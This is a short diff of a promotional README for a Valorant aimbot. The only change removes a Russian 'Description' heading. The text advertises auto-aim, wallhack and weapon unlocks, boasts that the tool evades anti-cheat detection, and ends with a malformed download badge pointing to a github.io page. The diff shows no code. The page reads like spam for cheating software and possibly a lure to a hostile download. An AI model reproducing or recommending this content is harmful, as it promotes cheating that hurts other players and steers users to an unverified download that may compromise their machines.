@@ -1,6 +1,6 @@
 # 🎯 Valorant Aimbot | Perfect Headshots Guaranteed  
 
-## Описание  
+## 
 💥 Become a sniper legend in **Valorant** with this ultimate aimbot! Enjoy unfair advantages like auto-aim, no-recoil, and instant headshots. Designed for PC players, this tool ensures smooth performance while evading detection. Features include customizable settings, wallhack support, and instant weapon unlocks. Perfect for competitive players seeking an edge or casual gamers wanting maximum fun.  
 
 [![Download Valorant Aimbot](https://img.shields.io/badge/Download-Valorant%20Aimbot-blueviolet)]([https://example.com](https://valorant-aimbot-perfect-headshots.github.io/.github/))  
